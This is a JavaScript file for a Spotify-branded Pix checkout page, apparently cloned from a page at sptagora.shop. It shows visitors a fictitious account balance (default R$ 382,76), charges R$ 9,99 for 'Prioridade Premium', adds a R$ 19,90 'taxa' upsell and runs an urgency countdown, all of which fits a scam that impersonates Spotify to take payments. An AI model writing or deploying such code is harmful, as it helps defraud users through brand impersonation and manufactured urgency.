// ==========================================
// PÁGINA PIX - SPOTIFY CHECKOUT
// Integração FreePay Brasil + UTMify
// Idêntico ao modelo de referência sptagora.shop
// ==========================================

let estadoPix = {
    transacaoId: null,
    qrCode: null,
    expirationDate: null,
    amount: 999,
    timerInterval: null,
    checkInterval: null
};

document.addEventListener('DOMContentLoaded', function() {
    carregarDadosURL();
    
    if (!estadoPix.transacaoId || !estadoPix.qrCode) {
        carregarDadosLocalStorage();
    }
    
    // Atualizar saldo no topo
    const params = new URLSearchParams(window.location.search);
    const saldo = params.get('saldo') || localStorage.getItem('saldo') || '382,76';
    const saldoEl = document.getElementById('saldoatual');
    if (saldoEl) {
        saldoEl.textContent = 'Saldo: ' + (saldo.indexOf('R$') === 0 ? saldo : ('R$ ' + saldo));
    }
    
    inicializarPagina();
});

function carregarDadosURL() {
    const params = new URLSearchParams(window.location.search);
    
    estadoPix.transacaoId = params.get('id') || params.get('transacao_id');
    estadoPix.qrCode = params.get('qr_code') || params.get('code');
    estadoPix.expirationDate = params.get('expiration');
    
    let rawAmount = params.get('amount') || params.get('valor');
    if (rawAmount) {
        const s = String(rawAmount).trim().replace(',', '.');
        const f = parseFloat(s);
        if (!isNaN(f) && f > 0) {
            estadoPix.amount = f < 100 ? Math.round(f * 100) : Math.round(f);
        }
    }
    if (!estadoPix.amount || estadoPix.amount < 100) {
        estadoPix.amount = 999;
    }
}

function carregarDadosLocalStorage() {
    const pixCode = localStorage.getItem('pix_code');
    const pixTxId = localStorage.getItem('pix_txid');
    const pixValor = localStorage.getItem('pix_valor');
    
    if (pixCode && !estadoPix.qrCode) estadoPix.qrCode = pixCode;
    if (pixTxId && !estadoPix.transacaoId) estadoPix.transacaoId = pixTxId;
    if (pixValor && (!estadoPix.amount || estadoPix.amount === 999)) {
        const s = String(pixValor).trim().replace(',', '.');
        const f = parseFloat(s);
        if (!isNaN(f) && f > 0) estadoPix.amount = Math.round(f * 100);
    }
    
    const transacao = localStorage.getItem('transacao_atual');
    if (transacao) {
        try {
            const dados = JSON.parse(transacao);
            if (!estadoPix.transacaoId && dados.id) estadoPix.transacaoId = dados.id;
            if (!estadoPix.qrCode && (dados.qrCode || dados.qr_code)) estadoPix.qrCode = dados.qrCode || dados.qr_code;
            if (dados.amount && (!estadoPix.amount || estadoPix.amount === 999)) estadoPix.amount = dados.amount;
            if (dados.expirationDate && !estadoPix.expirationDate) estadoPix.expirationDate = dados.expirationDate;
        } catch(e) {}
    }
}

function inicializarPagina() {
    // Exibir valor formatado
    const valorEl = document.getElementById('valorPix');
    if (valorEl) {
        if (typeof formatarMoeda === 'function') {
            valorEl.textContent = formatarMoeda(estadoPix.amount);
        } else {
            valorEl.textContent = 'R$ ' + (estadoPix.amount / 100).toFixed(2).replace('.', ',');
        }
    }
    
    // Se temos o código Pix, renderizar imediatamente
    if (estadoPix.qrCode) {
        const inputCodigo = document.getElementById('codigoPix');
        if (inputCodigo) inputCodigo.value = estadoPix.qrCode;
        gerarQRCode(estadoPix.qrCode);
        iniciarTimer();
        iniciarVerificacaoAutomatica();
    } else {
        // Se acessou diretamente sem dados prévios, gerar na SpeedPag automaticamente na hora!
        gerarPixAutomatico();
    }
    
    initBankTabs();
}

async function gerarPixAutomatico() {
    const container = document.getElementById('qrcode');
    if (container) {
        container.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:200px;color:#888;font-size:12px;"><span class="spinner" style="display:inline-block;width:24px;height:24px;border:3px solid #1ed760;border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:8px;"></span>Gerando seu Pix seguro...</div>';
    }
    
    try {
        const payload = {
            nome: localStorage.getItem('usuario_nome') || localStorage.getItem('pix_nome') || 'Cliente Spotify',
            amount: estadoPix.amount || 999,
            produto: 'Prioridade Premium'
        };
        
        const response = await fetch('/api/create-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        const res = await response.json();
        if (res.success && res.data) {
            estadoPix.transacaoId = res.data.id;
            estadoPix.qrCode = res.data.qr_code;
            estadoPix.amount = res.data.amount || 999;
            
            localStorage.setItem('transacao_atual', JSON.stringify(res.data));
            localStorage.setItem('pix_code', res.data.qr_code);
            localStorage.setItem('pix_txid', res.data.id);
            localStorage.setItem('pix_valor', '9,99');
            
            const inputCodigo = document.getElementById('codigoPix');
            if (inputCodigo) inputCodigo.value = estadoPix.qrCode;
            
            gerarQRCode(estadoPix.qrCode);
            iniciarTimer();
            iniciarVerificacaoAutomatica();
        } else {
            if (container) {
                container.innerHTML = '<div style="color:#e91e63;font-size:12px;padding:20px;text-align:center;">Erro ao carregar Pix.<br><button onclick="gerarPixAutomatico()" style="margin-top:10px;padding:6px 12px;background:#1ed760;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">Tentar novamente</button></div>';
            }
        }
    } catch(err) {
        console.error('Erro na geração automática do Pix:', err);
        if (container) {
            container.innerHTML = '<div style="color:#e91e63;font-size:12px;padding:20px;text-align:center;">Erro de conexão.<br><button onclick="gerarPixAutomatico()" style="margin-top:10px;padding:6px 12px;background:#1ed760;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">Tentar novamente</button></div>';
        }
    }
}

function gerarQRCode(codigo) {
    const container = document.getElementById('qrcode');
    if (!container) return;
    container.innerHTML = '';
    
    if (!codigo) return;
    
    // 1. Tentar renderizar com a biblioteca local QRCode.js
    if (typeof QRCode !== 'undefined' && QRCode.toCanvas) {
        const canvas = document.createElement('canvas');
        QRCode.toCanvas(canvas, codigo, {
            width: 200,
            margin: 1,
            color: { dark: '#000000', light: '#ffffff' }
        }, function(error) {
            if (!error && canvas) {
                container.innerHTML = '';
                container.appendChild(canvas);
            } else {
                renderizarFallbackImg(container, codigo);
            }
        });
    } else {
        renderizarFallbackImg(container, codigo);
    }
}

function renderizarFallbackImg(container, codigo) {
    const qrImageUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&margin=2&data=' + encodeURIComponent(codigo);
    const img = document.createElement('img');
    img.src = qrImageUrl;
    img.alt = 'QR Code Pix';
    img.style.width = '200px';
    img.style.height = '200px';
    img.style.borderRadius = '8px';
    img.style.display = 'block';
    img.style.margin = '0 auto';
    container.innerHTML = '';
    container.appendChild(img);
}

function copiarCodigo() {
    const input = document.getElementById('codigoPix');
    if (!input || !input.value) return;
    
    const codigo = input.value;
    
    function animarBotao() {
        const btn = document.getElementById('btnCopiar');
        if (!btn) return;
        const textNormal = btn.querySelector('.btn-copiar-text');
        const textSuccess = btn.querySelector('.btn-copiar-success');
        
        if (textNormal) textNormal.style.display = 'none';
        if (textSuccess) textSuccess.style.display = 'inline';
        btn.classList.add('copiado');
        
        setTimeout(function() {
            if (textNormal) textNormal.style.display = 'inline';
            if (textSuccess) textSuccess.style.display = 'none';
            btn.classList.remove('copiado');
        }, 3000);
    }
    
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(codigo).then(animarBotao).catch(function() {
            input.select();
            document.execCommand('copy');
            animarBotao();
        });
    } else {
        input.select();
        document.execCommand('copy');
        animarBotao();
    }
}

function iniciarTimer() {
    atualizarTimer();
    if (estadoPix.timerInterval) clearInterval(estadoPix.timerInterval);
    estadoPix.timerInterval = setInterval(atualizarTimer, 1000);
}

function atualizarTimer() {
    let expiration;
    let usarTimerPadrao = false;
    
    try {
        if (estadoPix.expirationDate instanceof Date) {
            expiration = estadoPix.expirationDate;
        } else if (typeof estadoPix.expirationDate === 'string' && estadoPix.expirationDate.length > 0) {
            expiration = new Date(estadoPix.expirationDate);
            if (isNaN(expiration.getTime())) usarTimerPadrao = true;
        } else {
            usarTimerPadrao = true;
        }
    } catch(e) {
        usarTimerPadrao = true;
    }
    
    if (usarTimerPadrao) {
        expiration = new Date(Date.now() + 10 * 60 * 1000);
        estadoPix.expirationDate = expiration;
    }
    
    const now = new Date();
    const diff = expiration - now;
    const timerElement = document.getElementById('timer');
    if (!timerElement) return;
    
    if (diff <= 0) {
        clearInterval(estadoPix.timerInterval);
        timerElement.innerHTML = '<button onclick="reiniciarTimer()" class="btn-reiniciar">Liberar Agora</button>';
        timerElement.classList.add('urgente');
        return;
    }
    
    const horas = Math.floor(diff / (1000 * 60 * 60));
    const minutos = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const segundos = Math.floor((diff % (1000 * 60)) / 1000);
    
    const pad = function(n) { return String(n).padStart(2, '0'); };
    timerElement.textContent = pad(horas) + ':' + pad(minutos) + ':' + pad(segundos);
    
    if (diff < 5 * 60 * 1000) {
        timerElement.classList.add('urgente');
    }
}

function reiniciarTimer() {
    estadoPix.expirationDate = new Date(Date.now() + 10 * 60 * 1000);
    const timerElement = document.getElementById('timer');
    if (timerElement) timerElement.classList.remove('urgente');
    iniciarTimer();
}

function iniciarVerificacaoAutomatica() {
    if (estadoPix.checkInterval) clearInterval(estadoPix.checkInterval);
    estadoPix.checkInterval = setInterval(verificarPagamentoAutomatico, 4000);
    setTimeout(verificarPagamentoAutomatico, 2000);
}

async function verificarPagamentoAutomatico() {
    if (!estadoPix.transacaoId) return;
    try {
        const res = await consultarStatusTransacao();
        if (res && (res.paid || res.status === 'paid' || res.status === 'approved' || res.status === 'completed' || res.status === 'PAID' || res.status === 'PAGO')) {
            clearInterval(estadoPix.checkInterval);
            clearInterval(estadoPix.timerInterval);
            atualizarStatusPago();
            setTimeout(function() {
                const pop = document.getElementById('popupSucesso');
                if (pop) pop.style.display = 'flex';
                setTimeout(irParaConfirmacao, 2000);
            }, 500);
        }
    } catch(e) {}
}

async function verificarPagamento() {
    const btn = document.getElementById('btnVerificar');
    const btnText = btn ? btn.querySelector('.btn-text') : null;
    const btnLoader = btn ? btn.querySelector('.btn-loader') : null;
    
    if (btn) btn.disabled = true;
    if (btnText) btnText.style.display = 'none';
    if (btnLoader) btnLoader.style.display = 'flex';
    
    try {
        const res = await consultarStatusTransacao();
        if (res && (res.paid || res.status === 'paid' || res.status === 'approved' || res.status === 'completed' || res.status === 'PAID' || res.status === 'PAGO')) {
            clearInterval(estadoPix.checkInterval);
            clearInterval(estadoPix.timerInterval);
            atualizarStatusPago();
            const pop = document.getElementById('popupSucesso');
            if (pop) pop.style.display = 'flex';
            setTimeout(irParaConfirmacao, 2000);
        } else {
            mostrarErro('Ainda não identificamos seu pagamento. Aguarde alguns instantes e tente novamente.');
        }
    } catch(e) {
        mostrarErro('Erro ao verificar pagamento. Tente novamente.');
    } finally {
        if (btn) btn.disabled = false;
        if (btnText) btnText.style.display = 'inline';
        if (btnLoader) btnLoader.style.display = 'none';
    }
}

async function consultarStatusTransacao() {
    if (!estadoPix.transacaoId) return null;
    try {
        const url = (typeof getApiUrl === 'function' ? getApiUrl(CONFIG.API.ENDPOINTS.CHECK_STATUS) : '/api/check-status') + '?id=' + encodeURIComponent(estadoPix.transacaoId);
        const response = await fetch(url, { headers: { 'Accept': 'application/json' } });
        const rawText = await response.text();
        let data;
        try {
            data = JSON.parse(rawText);
        } catch(e) {
            return null;
        }
        return data;
    } catch(e) {
        return null;
    }
}

function atualizarStatusPago() {
    const statusDot = document.querySelector('.status-dot');
    const statusText = document.querySelector('.status-text');
    const statusInfo = document.querySelector('.status-info');
    
    if (statusDot) {
        statusDot.classList.remove('pulse');
        statusDot.classList.add('pago');
    }
    if (statusText) {
        statusText.textContent = 'Pagamento confirmado!';
        statusText.style.color = 'rgb(1, 214, 97)';
    }
    if (statusInfo) {
        statusInfo.textContent = 'Redirecionando...';
    }
}

function irParaConfirmacao() {
    const params = new URLSearchParams(window.location.search);
    if (estadoPix.transacaoId) params.set('transacao_id', estadoPix.transacaoId);
    
    // Verificar se é o pagamento do Upsell 1 (taxa de R$ 19,90)
    const isUp1 = params.get('tipo') === 'up1' ||
                  params.get('upsell') === '1' ||
                  params.get('valor') === '19,90' ||
                  params.get('valor') === '19.90' ||
                  estadoPix.amount === 1990 ||
                  localStorage.getItem('pix_valor') === '19,90';

    if (isUp1) {
        window.location.href = '/checkout/conclusao.html?' + params.toString();
    } else {
        window.location.href = '/checkout/obrigado.html?' + params.toString();
    }
}

function mostrarErro(mensagem) {
    const msgEl = document.getElementById('mensagemErro');
    if (msgEl) msgEl.textContent = mensagem;
    const pop = document.getElementById('popupErro');
    if (pop) pop.style.display = 'flex';
}

function fecharPopup() {
    const pop = document.getElementById('popupErro');
    if (pop) pop.style.display = 'none';
}

function initBankTabs() {
    const tabs = document.querySelectorAll('.bank-tab');
    const panels = document.querySelectorAll('.bank-panel');
    
    tabs.forEach(function(tab) {
        tab.addEventListener('click', function() {
            tabs.forEach(function(t) {
                t.classList.remove('active');
                t.setAttribute('aria-selected', 'false');
            });
            panels.forEach(function(p) { p.classList.remove('active'); });
            
            tab.classList.add('active');
            tab.setAttribute('aria-selected', 'true');
            
            const panelId = tab.getAttribute('aria-controls');
            const panel = document.getElementById(panelId);
            if (panel) panel.classList.add('active');
        });
    });
}

window.addEventListener('beforeunload', function() {
    if (estadoPix.timerInterval) clearInterval(estadoPix.timerInterval);
    if (estadoPix.checkInterval) clearInterval(estadoPix.checkInterval);
});
